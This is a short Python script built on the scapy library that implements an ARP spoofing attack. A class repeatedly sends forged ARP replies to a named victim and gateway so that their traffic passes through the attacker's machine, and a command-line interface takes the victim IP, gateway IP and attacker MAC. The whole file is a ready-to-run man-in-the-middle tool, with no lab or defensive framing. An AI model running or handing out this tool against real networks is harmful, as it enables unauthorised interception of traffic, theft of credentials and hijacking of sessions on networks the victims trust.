from scapy.all import ARP, send
import time
import sys
import signal

class ARPSpoofer:
    def __init__(self, victim_ip, gateway_ip, attacker_mac, interval=2):
        self.victim_ip = victim_ip
        self.gateway_ip = gateway_ip
        self.attacker_mac = attacker_mac
        self.interval = interval
        self.running = True

        # ARP packets
        self.arp_to_victim = ARP(op=2, psrc=self.gateway_ip, pdst=self.victim_ip, hwsrc=self.attacker_mac)
        self.arp_to_gateway = ARP(op=2, psrc=self.victim_ip, pdst=self.gateway_ip, hwsrc=self.attacker_mac)

    def start(self):
        print("[*] ARP spoofing started...")
        signal.signal(signal.SIGINT, self.stop)

        while self.running:
            send(self.arp_to_victim, verbose=False)
            send(self.arp_to_gateway, verbose=False)
            print(f"[+] Poisoned {self.victim_ip} and {self.gateway_ip}")
            time.sleep(self.interval)

    def stop(self, *args):
        print("\n[*] Restoring ARP tables...")

        send(ARP(op=2, psrc=self.gateway_ip, pdst=self.victim_ip, hwdst="ff:ff:ff:ff:ff:ff"), count=5, verbose=False)
        send(ARP(op=2, psrc=self.victim_ip, pdst=self.gateway_ip, hwdst="ff:ff:ff:ff:ff:ff"), count=5, verbose=False)

        self.running = False
        print("[*] Stopped.")
        sys.exit(0)


if __name__ == "__main__":
    import argparse

    parser = argparse.ArgumentParser()
    parser.add_argument("--victim", required=True)
    parser.add_argument("--gateway", required=True)
    parser.add_argument("--mac", required=True)
    args = parser.parse_args()

    spoofer = ARPSpoofer(
        victim_ip=args.victim,
        gateway_ip=args.gateway,
        attacker_mac=args.mac
    )
    spoofer.start()